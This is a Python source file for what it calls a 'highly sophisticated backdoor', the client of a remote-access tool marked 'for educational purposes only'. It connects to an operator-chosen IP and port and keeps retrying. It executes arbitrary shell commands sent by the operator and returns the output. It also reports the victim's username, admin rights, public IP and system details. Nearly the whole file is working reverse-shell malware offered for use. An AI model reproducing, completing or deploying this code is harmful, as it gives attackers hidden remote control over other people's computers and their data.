'''

            ISO - In Side Out
            
        created by CookiesKush420
           github.com/Callumgm
       
       
    This a highly sophisticated backdoor that can be
    used to gain access to a target machine and execute terminal commands.
    
    CREATED FOR EDUCATIONAL PURPOSES ONLY.
     
'''

### System Modules ###
import os
import socket
import ctypes
import shutil
import signal
import platform
import requests
import subprocess

from typing import Tuple
from time import sleep

IP   = "IP_HERE"
PORT = int("PORT_HERE")


class Client():
    #region Client Functions
    def __init__(self, connect:Tuple[str,int]=(IP, PORT)) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

        self.bot_name   = str(os.getlogin()).lower()                    # Get bot name
        self.temp       = os.getenv('temp')                             # Get temp directory
        self.is_admin   = ctypes.windll.shell32.IsUserAnAdmin() != 0    # Check if user is admin
        self.public_ip  = self.getip()                                  # Get public IP address
        self.system     = platform.uname()                              # Get system info

        self.stop = False
        self.run  = False

        while not self.stop:
            try: self._connect(connect)
            except KeyboardInterrupt: continue
            except: sleep(1)

    def exit_gracefully(self, signum, frame):
        self.stop = True
        self.run = False
        self.sock.close()
        sleep(1)
        os._exit(1)

    def _connect(self, connect:Tuple[str,int]) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(connect)      # Connect to the server
        self.start()                    # Start client

    def _recv(self):
        rec = self.sock.recv(1024).decode("ascii")

        if rec[4:] == "root":
            return rec

        else: return rec.lower()
    #endregion

    def getip(self):
        ''' Get public IP address '''
        try: ip = requests.get("https://api.ipify.org").text
        except: ip = "None"
        return ip

    def _shell_run(self, commands):
        ''' Run shell commands '''
        subproces = subprocess.Popen(commands, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output    = subproces.stderr.read() + subproces.stdout.read()

        if len(output) == 0: output = b"No Output"
        self.sock.send(output)

    def start(self):
        while True:
            data = self._recv()
            
            if "root" in data:
                try:
                    data = data.replace("root ","")
                    commands = str(data)

                    self._shell_run(commands)
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif "admincheck" in data:
                try: self.sock.send(str.encode("Admin privileges")) if self.is_admin == True else self.sock.send(str.encode("NO Admin privileges"))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif data == "kill":
                self.sock.send(str.encode("Client Killed"))
                self.sock.close()
                self.exit_gracefully(0,0)

            elif data == "getip":
                try: self.sock.send(str.encode(f"{self.public_ip}    \t{self.system.system}"))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))

            elif data == "sysinfo":
                try: 
                    total, used, free = shutil.disk_usage("/")

                    data = f"""
    ------------------- Main Info -------------------
            Username:   \t{self.bot_name}
            Admin:      \t{self.is_admin}
            Public IP:  \t{self.public_ip}

    ------------------- Disk Info -------------------
            Total:      \t{total // (2**30)} GB
            Used:       \t{used // (2**30)} GB
            Free:       \t{free // (2**30)} GB

    ------------------- System Info -------------------
            System:     \t{self.system.system}
            Node Name:  \t{self.system.node}
            Release:    \t{self.system.release}
            Version:    \t{self.system.version}
            Machine:    \t{self.system.machine}
            Processor:  \t{self.system.processor}
                    """
                    self.sock.send(str.encode(data))
                except Exception as e: self.sock.send(f"\n\nError:\n\n{e}\n\n========================================================================\n\n".encode("ascii"))
 
            else: self.sock.send(str.encode("Invalid Command"))

if __name__ == "__main__":
    try: requests.get('https://google.com')
    except: os._exit(1)

    Client()

